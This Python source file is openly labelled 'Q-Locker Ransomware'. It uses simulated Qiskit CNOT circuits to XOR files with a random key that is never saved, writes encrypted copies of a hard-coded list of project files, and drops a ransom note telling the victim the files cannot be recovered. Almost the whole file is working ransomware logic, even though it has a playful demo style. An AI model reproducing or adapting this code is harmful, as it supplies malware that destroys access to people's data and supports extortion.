from qiskit import QuantumCircuit, transpile
from qiskit_aer import Aer
import os

class Q_LOCKER:
    def __init__(self, files, context = b"Q-LOCKER v1.0 (2025)"):
        self.files = files
        self.context = context
        self.key = os.urandom(16)

        self.backend = Aer.get_backend("qasm_simulator")

    def bytes_to_bits(self, data):
        return list(''.join(f'{byte:08b}' for byte in data))

    def bits_to_bytes(self, bits):
        return bytes(int(''.join(bits[i : i + 8]), 2) for i in range(0, len(bits), 8))

    def generate_circuits(self, message):
        message_binary = self.bytes_to_bits(self.context + message)
        key_binary = self.bytes_to_bits(self.key)
        
        circuits = []
        for i in range(len(message_binary)):
            circuit = QuantumCircuit(2, 2)
            
            if key_binary[i % len(key_binary)] == "1":
                circuit.x(0)

            if message_binary[i] == "1":
                circuit.x(1)

            circuit.cx(0, 1)

            circuit.measure(0, 0)
            circuit.measure(1, 1)

            circuits.append(circuit)

        return circuits

    def encrypt(self, message):
        """
        Diagrama lógico de cada compuerta CNOT usada en el cifrado:

            key     ───●─────
                       │
            message ───⊕───── encrypted

        Descripción:
        Esta función encripta un mensaje utilizando circuitos cuánticos 
        que contienen compuertas CNOT. Por cada carácter (o bit) del mensaje,
        se genera un circuito (usualmente con una compuerta CNOT) mediante 
        `self.generate_circuits(message)`.

        Luego, por cada circuito:
        - Se transpila el circuito para el backend seleccionado.
        - Se ejecuta con 1 shot (una medición).
        - Se obtiene el resultado medido como una cadena de bits.
        - Se toma la única clave (ya que solo hay un resultado) y se concatena
          a `encrypted`.

        Finalmente, retorna la cadena encriptada como un string de bits.

        Returns:
            encrypted (str): Cadena de bits con el resultado del cifrado cuántico.
        """

        circuits = self.generate_circuits(message)
        compiled = transpile(circuits, self.backend) # Tarda bastante!
        results = self.backend.run(compiled, shots = 1, memory = True).result()

        encrypted = []
        for circuit in compiled:
            memory = results.get_memory(circuit)[0]
            encrypted_bit = memory[0]
            encrypted.append(encrypted_bit)

        return self.bits_to_bytes(encrypted)

    def ransomware(self):
        for file in self.files:
            open_file = open(file, "rb").read()
            encrypted = self.encrypt(open_file)

            file_name = file.split("/")[1]
            output_file = open(f"ENCRYPTED_{file_name.split('.')[0]}", "wb")
            output_file.write(encrypted)
            output_file.close()

def main():
    FILES = [
        "proyecto_codex/objetivos.md",
        "proyecto_codex/etica.md",
        "proyecto_codex/incidentes.md"
    ]
    qlocker = Q_LOCKER(FILES)
    qlocker.ransomware()
    popup = f'''
        Q-Locker Ransomware v1.0

        Ooops, your files have been encrypted!

        What happened to my computer?
        - Your important files are encrypted.
            Many of your documents, photos, videos, databases and other files are
            no longer accessible because they have been encrypted with... ¡Quantum Physics!

        - Can i recover my files?
            No.
    '''
    file = open("info.txt", "w")
    file.write(popup)
    file.close()

if __name__ == '__main__':
    main()